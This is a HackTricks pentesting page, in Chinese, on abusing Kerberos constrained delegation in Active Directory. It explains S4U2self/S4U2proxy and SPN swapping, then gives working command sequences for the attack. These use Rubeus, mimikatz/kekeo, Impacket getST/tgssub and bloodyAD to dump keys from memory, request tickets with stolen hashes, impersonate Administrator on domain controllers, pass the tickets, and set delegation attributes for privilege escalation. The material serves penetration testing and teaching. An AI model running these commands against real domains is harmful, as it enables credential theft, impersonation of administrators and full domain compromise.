# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

使用此功能，域管理员可以**允许**一台计算机针对某台机器上的任意**服务**来**冒充用户或计算机**。

- **Service for User to self (_S4U2self_)：** 任何**拥有 SPN 的服务帐户**通常都可以代表任意用户获取自身的 TGS。如果该帐户的 _userAccountControl_ 中还设置了 [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)（T2A4D），则该 TGS 将是**可转发的**，这正是 protocol transition 对 **classic constrained delegation** 直接有用的原因。
- **Service for User to Proxy(_S4U2proxy_)：** **服务帐户**可以代表用户，针对 **msDS-AllowedToDelegateTo** 中列出的 SPN 获取 TGS。S4U2Proxy 使用的证据票据必须是发往委派服务的**可转发**票据：可以是从受害者处捕获的真实客户端到服务票据，也可以是通过 **S4U2Self + T2A4D** 生成的票据。

**注意**：如果用户在 AD 中被标记为“_Account is sensitive and cannot be delegated_”，或者是 **Protected Users** 的成员，通常将**无法通过 constrained delegation 冒充**该用户。在现代域中，针对启用了 delegation 的帐户时，应优先使用 **AES** material，而不要仅依赖 RC4。

这意味着，如果你**窃取了服务的 hash**，就可以**冒充用户**，并代表他们针对指定机器上的任意**服务**获取**访问权限**（可能实现 **privesc**）。

此外，你**不仅能访问用户可以被冒充访问的服务，还能访问任意服务**，因为 SPN（请求的服务名称）不会被检查（在票据中，这一部分未加密或签名）。因此，如果你可以访问 **CIFS service**，也可以使用 Rubeus 中的 `/altservice` flag 访问 **HOST service**。Impacket 的 **getST -altservice** 以及其他工具也利用了相同的 SPN swapping 弱点。

另外，DC 上的 **LDAP service access** 正是利用 **DCSync** 所需的权限。
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**操作员注意：**不要仅凭 **ADUC** 或 BloodHound 截图来审核 **gMSA/sMSA**。这些账户通常会隐藏常规的 Delegation 选项卡，因此应直接枚举原始的 **`userAccountControl`** 和 **`msDS-AllowedToDelegateTo`** 属性。
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition 与 Kerberos-only constrained delegation

如果被攻陷的账户具有 **T2A4D**，通常只需服务密钥/TGT 即可完成完整的 **`S4U2Self -> S4U2Proxy`** 链。<sup>[[2]](#references)</sup>

如果它仅具有 **`msDS-AllowedToDelegateTo`**（经典的 **"Use Kerberos only"** 模式），仍然可以滥用 delegation，但用于 S4U2Proxy 的证据票据必须是面向 delegation 服务的**真实、可转发的用户到服务票据**。实际上，这意味着需要从 **LSASS/ccache** 窃取或捕获受害者 TGS，并将其传入第二阶段（Rubeus 中的 `/tgs:`）。对于经典 constrained delegation，**不可转发的** S4U2Self 票据并不足够；如果这是你唯一的证据票据，请改为检查 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)。<sup>[[2]](#references)</sup>

### 跨域 constrained delegation 注意事项（2025+）

从 **Windows Server 2012/2012 R2** 开始，KDC 通过 S4U2Proxy extensions 支持跨 domains/forests 的 **constrained delegation**。现代版本（Windows Server 2016–2025）保留了这一行为，并添加两个 PAC SIDs 来标示 protocol transition：<sup>[[1]](#references)</sup>

- `S-1-18-1`（**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**），用户正常进行 authentication 时使用。
- `S-1-18-2`（**SERVICE_ASSERTED_IDENTITY**），服务通过 protocol transition 声明该身份时使用。

跨 domains 使用 protocol transition 时，预期 PAC 中会包含 `SERVICE_ASSERTED_IDENTITY`，这表明 S4U2Proxy 步骤已成功。<sup>[[1]](#references)</sup>

### Impacket / Linux tooling（altservice & full S4U）

近期的 Impacket（0.11.x+）公开了与 Rubeus 相同的 S4U 链和 SPN swapping：<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
如果你更倾向于先伪造用户 ST（例如只有离线 hash），可以将 **ticketer.py** 与 **getST.py** 搭配用于 S4U2Proxy。当你已经拥有可用的 ccache，只需为同一主机替换 service class 时，**tgssub.py** 也很实用。有关当前存在的问题（伪造的 ST 与 SPN key 不匹配时出现 KRB_AP_ERR_MODIFIED），请参阅公开的 Impacket issue #1713。<sup>[[2]](#references)</sup>

### 从低权限凭据自动化设置 delegation

如果你已经对某个 computer 或 service account 拥有 **GenericAll/WriteDACL**，可以使用 **bloodyAD**（2024+）远程推送所需属性，而无需 RSAT：
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
这使你能够在可以写入这些属性后，无需 DA privileges 即构建用于 privesc 的 constrained delegation 路径。

- Step 1: **获取允许服务的 TGT**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> 还有**其他获取 TGT ticket 的方法**，或者在不以 SYSTEM 身份控制计算机的情况下获取 **RC4** 或 **AES256**，例如 Printer Bug、unconstrain delegation、NTLM relaying 和 Active Directory Certificate Service abuse。
>
> **仅凭这个 TGT ticket（或其哈希值），无需攻陷整台计算机即可执行此攻击。**

- 步骤2：**获取以该用户身份模拟服务的 TGS**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**更多信息请参阅 ired.team。**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) 和 [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Kerberos 约束委派概述（Microsoft Learn，2025）](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [使用 Impacket 滥用委派（第 2 部分）：约束委派（Black Hills，2025）](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos 约束委派（ired.team）](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity 终结了域：Offensive Kerberos 概述（SpecterOps）](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
{{#include ../../banners/hacktricks-training.md}}
